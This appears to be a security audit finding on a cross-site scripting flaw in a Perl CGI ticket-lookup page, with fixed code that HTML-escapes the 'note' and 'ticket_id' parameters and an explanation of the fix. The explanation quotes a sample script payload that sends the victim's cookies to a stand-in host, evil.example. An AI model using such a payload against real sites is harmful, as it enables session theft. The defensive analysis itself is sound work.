## Verdict
Confirmed. The customer note parameter is written into the HTML response without HTML-entity encoding, allowing stored/reflected script injection via the `note` CGI parameter.

## Source
`$cgi->param('note')` on line 18 — an attacker-controlled CGI query/form parameter read directly from the request.

## Fix

```perl
#!/usr/bin/perl
use strict;
use warnings;
use CGI;

# Helpdesk ticket lookup page: renders the ticket ID and an optional
# customer-supplied note back onto the confirmation screen.

my $cgi = CGI->new;
my $ticket_id = $cgi->param('ticket_id');

print $cgi->header;
print "<html><head><title>Ticket Lookup</title></head><body>\n";
print "<h2>Ticket #" . $cgi->escapeHTML($ticket_id) . "</h2>\n";
print "<p>Status: Open</p>\n";

print "<p>Customer note: " . $cgi->escapeHTML($cgi->param('note')) . "</p>\n";

print "</body></html>\n";
```

## Explanation
`$cgi->param('note')` is attacker-controlled request data that flows directly into the HTML response body via string concatenation, with no encoding applied before it reaches the `print` sink on line 18. A value such as `<script>document.location='https://evil.example/steal?c='+document.cookie</script>` would be emitted verbatim into the page and executed in the victim's browser.

The fix wraps the tainted value in `CGI->escapeHTML()`, which converts `<`, `>`, `&`, and quote characters into their HTML entity equivalents (`&lt;`, `&gt;`, `&amp;`, `&quot;`) before concatenation, so any markup or script tags in the note render as inert text rather than being parsed as HTML. `escapeHTML` is CGI.pm's built-in output-encoding method, so no additional dependency is introduced.

`ticket_id`, read from the same untrusted `param()` source and echoed on line 14 through the same unescaped-concatenation pattern, is escaped as well — it is exposed to the identical injection vector and sits in the same call chain, so leaving it unescaped would leave an equivalent bypass in place immediately next to the fixed line.

Escaping is applied at the point of output (encode-on-output), which is the correct place for this defense: it neutralizes the value regardless of how it was validated or stored upstream, and it does not alter the underlying data, only its rendering into an HTML context.
